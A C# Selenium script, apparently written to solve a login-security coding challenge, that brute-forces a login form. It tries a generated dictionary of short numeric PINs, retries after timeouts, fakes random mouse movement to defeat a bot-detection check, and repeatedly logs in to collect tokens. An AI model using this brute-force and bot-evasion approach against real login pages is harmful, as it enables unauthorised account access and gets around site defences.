using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;

namespace FlinksLogin
{
    public class AutomatedLoginService
    {
        // twice the amount in case some events are missed
        private const int MinimumOccurenceMouseMove = 10 * 2;
        private const int TargetOccurences = 50;

        private static string _loginPageUrl;
        private static string _challengeId;
        private static int _occurence;

        private readonly IWebDriver _driver;
        private IList<string> _loginDictionary;

        public AutomatedLoginService(string url)
        {
            // HACK: make driver's path relative
            _driver = new ChromeDriver(@"/Users/Aymeric/00-Sources/flinks/FlinksLogin/bin/Debug/netcoreapp2.1");
            _driver.Url = url;

            _loginDictionary = GeneratePasswords();
        }

        public void Login()
        {
            NavigateToLogin();

//            var userWord = ForceLogin();
            var userWord = "2222";    // For fast debugging

            RetrieveAllTokens(userWord);
        }

        private void NavigateToLogin()
        {
            var start = _driver.FindElement(By.LinkText("START"));

            var href = start.GetAttribute("href");

            var startIndex = href.LastIndexOf('/');
            _challengeId = href.Substring(startIndex + 1, href.Length - startIndex - 1);
            _loginPageUrl = href;
            
            start.Click();
        }

        private string ForceLogin()
        {
            Console.WriteLine($"starting forcelogin... - {DateTime.Now.ToLongTimeString()}");

            foreach (var userWord in _loginDictionary)
            {
                Console.WriteLine($"login attempt with {userWord} - {DateTime.Now.ToLongTimeString()}");

                var areCredentialsCorrect = TryVerifyCredentials(userWord, userWord);

                if (areCredentialsCorrect)
                {
                    RetrieveToken();
                    return userWord;
                }
            }

            throw new NotFoundException("No valid credentials in the dictionary");
        }

        private bool TryVerifyCredentials(string login, string password)
        {
            var retryCount = 0;

            while (true)
            {
                try
                {
                    EnterCredentials(login, password);

                    return VerifyCredentials(login, password);
                }
                catch (WebDriverException)
                {
                    retryCount++;

                    Console.WriteLine(
                        $"attempt #{retryCount} to login with {login} / {password} timed out - {DateTime.Now.ToLongTimeString()}");

                    if (retryCount < 5)
                    {
                        Thread.Sleep(TimeSpan.FromSeconds(10));
                    }
                    else
                    {
                        throw;
                    }
                }
            }
        }

        private bool VerifyCredentials(string login, string password)
        {
            try
            {
                var loginResultTitle = _driver.FindElement(By.CssSelector("h3")).Text;
                
                var areCredentialsRight = loginResultTitle.ToUpper().Contains("CONGRATS");

                if (areCredentialsRight)
                {
                    Console.WriteLine($"SUCCESS!! {login} {password} - {DateTime.Now.ToLongTimeString()}");
                    return true;
                }
            }
            catch
            {
            }

            return false;
        }

        private void EnterCredentials(string login, string password)
        {
            // Source code seems to demand a certain amount of mouse move
            // if (numberOfOccurenceMove == 10) { ... }
            MoveMouseRandomly();

            var usernameField = _driver.FindElement(By.Name("username"));
            var passwordField = _driver.FindElement(By.Name("password"));

            usernameField.Click();
            usernameField.SendKeys(login);

            passwordField.Click();
            passwordField.SendKeys(password);

            passwordField.Submit();
        }

        private void RetrieveAllTokens(string userWord)
        {
            while (_occurence <= TargetOccurences)
            {
//                NavigateRoRandomWebsite();    // useless...

                _driver.Url = _loginPageUrl;

                var areCredentialsStillAccepted = TryVerifyCredentials(userWord, userWord);

                if (!areCredentialsStillAccepted)
                {
                    Console.ReadLine();
                    throw new Exception("Something Went Wrong...");
                }

                RetrieveToken();
            }
        }

        private void RetrieveToken()
        {
            var token = _driver.FindElements(By.CssSelector("b"))
                .Select(x => x.Text)
                .Single(x => x.Length > 50); // HACK: shallow logic but works

            _occurence++; // HACK: would need to retrieve it from the page.

            Console.WriteLine($"Challenge Id {_challengeId} - Token {token} - Occurence {_occurence}");
        }

        private void NavigateRoRandomWebsite()
        {
            var websites = new List<string>();
            websites.Add("https://www.google.ca");
            websites.Add("https://www.medium.com");
            websites.Add("https://www.lemonde.fr");
            websites.Add("https://www.nytimes.com");
            
            var rand = new Random();
            var websiteToVisit = websites[rand.Next(1, websites.Count - 1)];

            _driver.Url = websiteToVisit;
            Thread.Sleep(TimeSpan.FromMilliseconds(rand.Next(2000, 20000)));
        }

        private void MoveMouseRandomly()
        {
            var action = new Actions(_driver);
            var rand = new Random();

            var occurenceMove = 0;
            while (occurenceMove < 2 * MinimumOccurenceMouseMove)
            {
                var x = rand.Next(-10, 10);
                var y = rand.Next(-10, 10);

                action.MoveByOffset(x, y);
                occurenceMove++;
            }
            action.Build().Perform();
        }

        private IList<string> GeneratePasswords()
        {
            // 0 to 4 digits pin with values 1,2 or 3
            // 3^0 + 3^1 + 3^2 + 3^3 + 3^4 = 121 (to be verified with a calc)
            var passwords = new List<string>();
            passwords.Add(string.Empty); // special case with no digits

            var currentLength = 0;

            while (currentLength < 4)
            {
                var longestPasswords = passwords.Where(x => x.Length == currentLength).ToList();
                foreach (var password in longestPasswords)
                {
                    var i = 1;
                    while (i < 4)
                    {
                        passwords.Add(password + i);
                        i++;
                    }
                }

                currentLength++;
            }

            return passwords;
        }
    }
}